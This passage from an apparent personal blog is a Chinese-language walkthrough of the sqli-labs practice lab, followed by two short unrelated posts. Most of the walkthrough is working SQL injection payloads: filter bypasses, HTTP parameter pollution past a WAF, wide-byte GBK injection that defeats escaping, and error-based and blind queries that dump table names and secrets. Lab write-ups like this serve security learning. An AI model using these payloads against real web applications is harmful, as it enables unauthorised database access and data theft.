$id= preg_replace(&apos;/Union/s&apos;,&quot;&quot;, $id);        //Strip out Union
$id= preg_replace(&apos;/Select/s&apos;,&quot;&quot;, $id);        //Strip out select
return $id;
}
</code></pre><p>  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br></p>
<p>  思路一：大小写绕过<br><br>  ?id=111%27%a0uNioN%a0sElEct%a01,version(),3%a0%27<br><br>  思路二：报错或延时？</p>
</li>
<li><p><strong>less 27a GET - Blind Based - All your UNION &amp; SELECT Belong to us -Double Quotes</strong><br><br>  1.?id=1%22%26%26%221=1 成功，猜测为“ “过滤<br><br>  2.?id=111%22%a0uNioN%a0sElEct%a01,version(),3%a0%22成功注入<br></p>
</li>
<li><p><strong>less 28 GET - Error Based - All your UNION &amp; SELECT Belong to us - String - Single Quotes with Parentesis</strong><br></p>
<pre><code>function blacklist($id)
{
$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);                //strip out /*
$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);                //Strip out --.
$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);                    //Strip out #.
$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);                //Strip out spaces.
$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);                    Strip out spaces.
$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);                //Strip out spaces.
$id= preg_replace(&apos;/union\s+select/i&apos;,&quot;&quot;, $id);        //Strip out UNION &amp; SELECT.
return $id;
}
 $sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;
</code></pre><p>  ?id=111%27)%a0uNioN%a0sElEct%a01,version(),3%a0||(%27</p>
<ul>
<li><strong>less 28a GET - Error Based - All your UNION &amp; SELECT Belong to us - String - Single Quotes - Parentesis</strong><br><pre><code>function blacklist($id)
{
$id= preg_replace(&apos;/union\s+select/i&apos;,&quot;&quot;, $id);        //Strip out spaces.
return $id;
}
$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;
</code></pre>?id=111%27)%a0uNioN%a0sElEct%a01,version(),3%a0||(%27   与less28相同</li>
</ul>
</li>
<li><p><strong>less 29 GET Error Based - IMPIDENCE MISMATCH - Having a WAF in Front of Web Application</strong><br><br>服务器（两层架构）<br><br>  当?id=1&amp;id=2， apache（php）解析最后一个参数，即显示 id=2 的内容。Tomcat（jsp）解析第 一个参数，即显示 id=1 的内容<br><br>  此处应该返回id=2 的内容，因为时间上提供服务的是 apache（php）服务器， 返回的数据也应该是 apache 处理的数据。 而在我们实际应用中， 也是有两层服务器的情况， 那为什么要这么做？是因为我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一 个 WAF。而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。该用法就 是 HPP（HTTP Parameter Pollution），http 参数污染攻击的一个应用。HPP 可对服务器和客 户端都能够造成一定的威胁。 <br><br>  ?id=1&amp;id=-2%27union%20select%201,user(),version()%27<br><br>  返回:<br><br>Your Login name:root@localhost<br><br>  Your Password:5.7.23-0ubuntu0.16.04.1</p>
</li>
<li><p><strong>less 30 GET Blind - IMPIDENCE MISMATCH - Having a WAF in Front of Web</strong><br><br>  ?id=1&amp;id=-2%22union%20select%201,user(),version()%22</p>
</li>
<li><p><strong>less 31 GET Blind - IMPIDENCE MISMATCH - Having a WAF in Front of Web</strong> <br><br>  ?id=1&amp;id=-2”)union%20select%201,user(),version()%23</p>
</li>
<li><p><strong>less 32 GET - Bypass Custom Filter Adding Slashes to Dangerous Chars</strong><br><br>宽字节注入<br><br>  原理：mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \’ （转换的函数或者思路会在每一关遇到的时候介绍）。 因此我们在此想办法将 ‘ 前面添加的 \ 除掉。<br><br>一般有两种思路： <br><br>  1、%df 吃掉 \ 具体的原因是 urlencode(‘) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27， 而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字， 此 事%df%5c 就是一个汉字， %27 则作为一个单独的符号在外面， 同时也就达到了我们的目的。<br><br>  2、将 \’ 中的 \ 过滤掉， 例如可以构造 %**%5c%5c%27 的情况， 后面的%5c 会被前面的%5c 给注释掉。这也是 bypass 的一种方法。<br></p>
<p>  addslashes() 函数返回在预定义字符之前添加反斜杠的字符串，预定义字符为：’   “  \<br><br>  addslashes()并未将反斜杠一起写入数据库，只是帮助mysql完成了sql语句的执行</p>
<pre><code>function check_addslashes($string)
{
    $string= addslashes($string);    
    return $string;
}
</code></pre><p>  例?id=-1%27%20union%20select%201,version(),user()%20%27<br><br>  The filtered request is :-1\’ union select 1,version(),user() \’<br></p>
<p>  ?id=-1%df%27%20union%20select%201,version(),user()%23<br><br>  返回:<br><br>Your Login name:5.7.23-0ubuntu0.16.04.1<br><br>  Your Password:root@localhost</p>
</li>
<li><p><strong>less 33 GET -  Bypass AddSlashers()</strong><br><br>  ?id=-1%df%27%20union%20select%201,version(),user()%23和less32一样</p>
</li>
<li><p><strong>less 34 POST - Bypass AddSlashers()</strong><br><br>  post型的方式我们是以url形式 提交的，因此数据会通过URLencode，如何将方法用在post型的注入当中，我们此处介绍 一个新的方法。将utf-8转换为utf-16或utf-32，例如将‘转为utf-16为’ 。我们就 可以利用这个方式进行尝试。<br></p>
<p>  運’ or 1=1 # 成功，猜测: 在后台運会被解析成%df%5c <br><br>  SELECT username, password FROM users WHERE username=’運\’ or 1=1# ‘ and password=’’ LIMIT 0,1</p>
</li>
<li><p><strong>less 35 GET - Bypass Add Slashes(we dont need them) Integer Based</strong><br><br>  php中：$sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;<br><br>  可以看出，不需要构造特殊符号<br><br>  ?id=-1%20union%20select%201,version(),user()%23<br></p>
</li>
<li><p><strong>less 36 GET - Bypass mysql_real _escape _string</strong><br><br>  mysql_real_escape_string(string,connection) 转义 SQL 语句中使用的字符串中的特殊字符<br><br>  string 必需，要转义的字符串<br><br>  connection 可选，规定 MySQL 连接。如果未规定，则使用上一个连接<br></p>
<pre><code>\x00  ascii码 null
\n    换行
\r    回车
\
&apos;
&quot;
\x1a （即十进制26）&amp;
</code></pre><p>  这些字符会被转义<br></p>
<pre><code>function check_quotes($string)
{
    $string= mysql_real_escape_string($string);    
    return $string;
}
$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;
</code></pre><p>  ?id=-1%df%27%20union%20select%201,version(),user()%23 成功</p>
</li>
<li><p><strong>less 37 POST - Bypass mysql_real_escape_string</strong> <br><br>  運’ or 1=1 #</p>
</li>
</ul>
<hr>
<p>Stacked injections:堆叠注入。从名词的含义就可以看到应该是一堆 sql 语句（多条）一起执 行。而在真实的运用中也是这样的，我们知道在 mysql 中，主要是命令行中，每一条语句结 尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。 <br><br>原理:<br><br>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql 语句后继续构造下一条语句， 会不会一起执行？因此这个想法也就造就了堆叠注入。 而 union injection （联合注入） 也是将两条语句合并在一起， 两者之间有什么区别么？区别就在于 union 或者 union all 执行的语句类型是有限的， 可以用来执行查询语句， 而堆叠注入可以执行的是 任意的语句。 <br><br>局限:<br><br>堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎 不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。 <br><br>虽然我们前面提到了堆叠查询可以执行任意的 sql 语句，但是这种注入方式并不是十分 的完美的。在我们的 web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。<br>因此，在读取数据时，我们建议使用 union（联合）注入。同时在使用堆叠注入之前， 我们也是需要知道一些数据库相关信息的，例如表名，列名等信息<br></p>
<p>暂不深入了解</p>
<hr>
<p>challenge</p>
<ul>
<li><p><strong>GET - challenge - Union -10 Queries Allowed - Variation1</strong><br><br>  1.查表名<br><br>  ?id=-1%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23<br><br>  得到此次的表名: 8TELU525VO<br><br>  2.查列名 用concat一次性查完输出<br><br>  ?id=-1%27%20union%20select%201,(select%20group_concat(column_name ,%22—%22)%20from%20information_schema.columns%20where%20table_name%3d%228TELU525VO%22),3%20%23<br><br>  返回:<br><br>Your Login name:id—,sessid—,secret_63JY—,tryy—<br><br>  Your Password:3<br><br>  3.得到密码id,sessid,secret_63JY<br><br>  ?id=-1%27%20union%20select%20id,sessid,secret_63JY%20from%208TELU525VO%20%23<br><br>  返回:<br><br>Your Login name:856213ca887976a33e3d91b2c61fa65a<br><br>  Your Password:M5ztHsC34iN2X0lzCiXJ27Cp<br><br>  4.输入 M5ztHsC34iN2X0lzCiXJ27Cp 完成</p>
</li>
<li><p><strong>GET - Challenge - Union - 14 Queries Allowed - Variation 2</strong><br><br>  1.猜测过滤规则<br><br>  当输入?id=1)%26%26(1=1 时 成功 可知过滤为()<br><br>  2.参考less 54<br><br>  ?id=-1)%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23<br><br>  表名为: C73JPUKYS9    <br><br>  ?id=-1)%20union%20select%201,(select%20group_concat(column_name ,%22—%22)%20from%20information_schema.columns%20where%20table_name%3d<br>  %22C73JPUKYS9%22),3%20%23<br><br>  列名: Your Login name:id—,sessid—,secret_DH0J—,tryy—<br><br>  ?id=-1)%20union%20select%20id,sessid,secret_DH0J%20from%20C73JPUKYS9%20%23<br><br>  密码：<br><br>Your Login name: 4d0218b33a232f675d53381ef38b5370<br><br>Your Password: kjbKG19I62vmYE3kS7gGN7qf <br> 成功</p>
</li>
<li><p><strong>GET - Challenge - Union - 14 Queries Allowed - Variation 3</strong><br><br>  1.猜测<br><br>  ?id=1%27)%26%26(%271=1 成功 可知为(‘ ‘)<br><br>  2.下面步骤如上<br></p>
</li>
<li><p><strong>GET - Challenge - Union - 14 Queries Allowed - Variation 4</strong><br><br>  如上</p>
</li>
<li><p><strong>GET - Challenge - Double Query -5 Queries Allowed - Variation 1</strong><br><br>  1.猜测<br><br>  ?id=1%27%26%26%271=1 成功，可知为’ ‘<br><br>  ?id=-1%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),3%20%23 <br>  返回同上，可知有其它过滤规则<br><br>  尝试报错注入<br><br>  ?id=-1%27%20union%20select%20updatexml(1,concat(0x7e,version(),0x7e),1)%23 成功返回version()<br><br>  2.获取表名<br><br>  ?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema%3d%27challenges%27),0x7e),1),1%23<br><br>  返回：XPATH syntax error: ‘~4HT916R6T1~’<br><br>  3.获取列名<br><br>  ?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20group_concat(column_name%20,”—“)%20from%20information_schema.columns%20where%20table_name%3d%20”4HT916R6T1”),0x7e),1),1%23<br><br>  返回: XPATH syntax error: ‘~id—,sessid—,secret_EN0R—,’为什么有一个列没显示<br><br>  4.获取密码<br><br>  ?id=-1%27%20union%20select%201,updatexml(1,concat(0x7e,(select%20secret_EN0R%20from%204HT916R6T1),0x7e),1),1%23<br><br>  返回: XPATH syntax error: ‘~OcDGOovBkd3XMq3FpuSNtEIN~’<br></p>
</li>
<li><p><strong>GET - Challenge - Double Query -5 Queries Allowed - Variation 2</strong><br><br>  ?id=1%26%261=1 返回成功，说明无字符<br><br>  剩余步骤如 less 58<br></p>
</li>
<li><p><strong>GET - Challenge - Double Query -5 Queries Allowed - Variation 3</strong><br> ?id=1%22%26%26%221=1 猜测为 “ “<br><br>?id=1%22)%26%26(%221=1 猜测为(“ “) <br><br>都返回相同结果？？？？<br><br>但实际上</p>
<pre><code>$id = &apos;(&quot;&apos;.$id.&apos;&quot;)&apos;;
  $sql=&quot;SELECT * FROM security.users WHERE id=$id LIMIT 0,1&quot;;
     if($row)
      {
          echo &apos;&lt;font color= &quot;#00FFFF&quot;&gt;&apos;;
          $unames=array(&quot;Dumb&quot;,&quot;Angelina&quot;,&quot;Dummy&quot;,&quot;secure&quot;,&quot;stupid&quot;,&quot;superman&quot;,&quot;batman&quot;,&quot;admin&quot;,&quot;admin1&quot;,&quot;admin2&quot;,&quot;admin3&quot;,&quot;dhakkan&quot;,&quot;admin4&quot;);
          $pass = array_reverse($unames);
          echo &apos;Your Login name : &apos;. $unames[$row[&apos;id&apos;]];
          echo &quot;&lt;br&gt;&quot;;
          echo &apos;Your Password : &apos; .$pass[$row[&apos;id&apos;]];
          echo &quot;&lt;/font&gt;&quot;;
      }
      else
      {
          echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;
          print_r(mysql_error());
          echo &quot;&lt;/font&gt;&quot;;  
      }
</code></pre><p> 每次返回都是$unames=array（），奸诈！！</p>
</li>
<li><p><strong>GET - Challenge - Double Query -5 Queries Allowed - Variation 4</strong><br><br>  $sql=”SELECT * FROM security.users WHERE id=((‘$id’)) LIMIT 0,1”;</p>
</li>
<li><p><strong>GET - Challenge - Blind -130 Queries Allowed - Variation 1</strong><br><br>  盲注了,该写脚本了，boolean或者延时,注意使用二分提高效率<br><br>  ?id=1%27)and If(ascii(substr((select group_concat(tabl e_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%2 7),1,1))=79,0,sleep(10))–+</p>
</li>
</ul>
<h3 id="三-杂记"><a href="#三-杂记" class="headerlink" title="三.杂记"></a>三.杂记</h3><ul>
<li><p>盲注<br><br>  语句执行完后没有回显<br><br>  1.基于布尔<br><br>  构造条件，有无界面显示来判断自己构造的消息是否正确（相当于猜测再验证，可以利用二分法提高效率）<br><br>  2.基于报错<br><br>  SELECT COUNT(SCHEMA_NAME) FROM information_schema.SCHEMATA GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)*2));<br><br>  [Err] 1062 - Duplicate entry ‘5.7.23-0ubuntu0.16.04.11’ for key ‘&lt;group_key&gt;’<br><br>  具体原理不懂，concat, floor, group by，rand(0)是关键<br><br>  如果rand被禁用可以使用用户变量来报错？？<br><br>  或者XPath报错等<br><br>  3.基于时间-延迟注入<br><br>  利用if,当条件正确或错误时，确定要不要sleep()来猜测<br></p>
</li>
<li><p>insert/update/delete注入<br><br>  思路：利用MYSQL对XML文档数据进行查询和修改的XPATH函数，进行报错回显<br></p>
</li>
<li><p>order by<br><br>可以用来确定有几列，如 order by 4 ,报错没有第四列<br></p>
</li>
<li><p>url编码</p>
<pre><code>空格    -    %20
&quot;          -    %22
#         -    %23
%        -    %25
&amp;         -    %26
(          -    %28
)          -    %29
+         -    %2B
,          -    %2C 逗号
/          -    %2F
:          -    %3A
;          -    %3B
&lt;         -    %3C
=         -    %3D
&gt;         -    %3E
?         -    %3F
@       -    %40
\          -    %5C
|          -    %7C
&apos;               %27  单引号
</code></pre></li>
<li><p>补充一些数据库知识<br></p>
<pre><code>infomation_shema这个数据库中保存了mysql服务器中的所有数据库信息。
如数据库名，数据库的表，表栏的数据类型与访问权限等。&lt;/br&gt;
再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，
每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。&lt;/br&gt;

information_schema的表schemata中的列schema_name记录了所有数据库的名字
information_schema的表tables中的列table_schema记录了所有数据库的名字
information_schema的表tables中的列table_name记录了所有数据库的表的名字
information_schema的表columns中的列table_schema记录了所有数据库的名字
information_schema的表columns中的列table_name记录了所有数据库的表的名字
information_schema的表columns中的列column_name记录了所有数据库的表的列的名字
</code></pre><p>查询指定数据库所有表名<br><br>SELECT table_name FROM information_schema.tables WHERE table_schema=’数据库名’;<br><br>查询mysql中所有数据库名字<br><br>SELECT schema_name FROM information_schema.schemata<br></p>
<p>  version()  mysql版本<br>  user()用户<br>  @@datadir数据路径<br>  @@version_compile_os 操作系统<br>  database() 数据库名字<br>  SELECT VERSION(), USER(), @@datadir, @@version_compile_os, DATABASE();<br>–+/# 注释，一般用#，url编码为%23<br><br><br>mysql中XPath:<br><br>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML()<br><br>ExtractValue():<br><br>  EXTRACTVALUE (XML_document, XPath_string); <br><br>  第一个参数：XML_document是String格式，为XML文档对象的名称<br><br>  第二个参数：XPath_string (Xpath格式的字符串) <br><br>  作用：从目标XML中返回包含所查询值的字符串<br><br>UpdateXml():<br><br>  UPDATEXML (XML_document, XPath_string, new_value); <br><br>  第一个参数：XML_document是String格式，为XML文档对象的名称<br><br>  第二个参数：XPath_string (Xpath格式的字符串) <br><br>  第三个参数：new_value，String格式，替换查找到的符合条件的数据 <br><br>  作用：改变文档中符合条件的节点的值 <br><br>通常利用其显错来进行注入，例 updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)<br><br>0x7E为~的ascii码<br><br><br>if<br><br>IF(expr1,expr2,expr3) 如果expr1为true返回expr2,否则返回expr3<br><br><br>concat() 连接字符串，将多个连接在一起。<br><br>  concat(str1,str2,…)<br><br>concat_ws() 将多个字符串连接在一起，可以一次性指定分隔符<br><br>  concat_ws(sparator, str1,str2,…)<br><br>group_concat() 将group by产生的同一个分组中的值连接起来，返回一个字符串结果<br><br>  group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator ‘分隔符’] )<br></p>
</li>
</ul>
<ul>
<li><p>问题：<br><br>1.怎么确定是哪种注入类型？<br><br>2.在没有返回值的情况下判断单引号双引号括号等</p>
</li>
<li><p>其它</p>
<pre><code>?id=1%27%26%26%271=1 猜测为’ ‘
?id=1%27)%26%26(%271=1 猜测为（’ ‘）
?id=1%22%26%26%221=1 猜测为 &quot; &quot;
?id=1%22)%26%26(%221=1 猜测为(&quot; &quot;)
?id=1)%26%26(1=1  猜测为()
?id=1%26%261=1 无
</code></pre></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/08/28/sql注入/" data-id="cjldemyps0007kkvp8iiiti5i" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入-sqli-labs/">sql注入,sqli-labs</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-reinstall" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/08/20/reinstall/" class="article-date">
  <time datetime="2018-08-20T01:37:39.000Z" itemprop="datePublished">2018-08-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/08/20/reinstall/">reinstall</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="重装"><a href="#重装" class="headerlink" title="重装"></a>重装</h2><p>重装系统，忘了备份本地md文件。不能找回，教训深刻。<br>在这记录一下解决方案，以免以后遇到。</p>
<ol>
<li>创建git分支</li>
<li>将文件提交上传到分支保存</li>
<li>git clone</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/08/20/reinstall/" data-id="cjldemyny0001kkvphlft38ey" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hexo/">hexo</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/08/19/hello-world/" class="article-date">
  <time datetime="2018-08-19T10:03:04.096Z" itemprop="datePublished">2018-08-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/08/19/hello-world/">Hello World</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/08/19/hello-world/" data-id="cjldemynr0000kkvpiif43as8" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/">sqlmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入-sqli-labs/">sql注入,sqli-labs</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/sql注入-sqli-labs/" style="font-size: 10px;">sql注入,sqli-labs</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2018/08/28/sqlmap/">sqlmap</a>
          </li>
        
          <li>
            <a href="/2018/08/28/sql注入/">sql注入</a>
          </li>
        
          <li>
            <a href="/2018/08/20/reinstall/">reinstall</a>
          </li>
        
          <li>
            <a href="/2018/08/19/hello-world/">Hello World</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2018 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>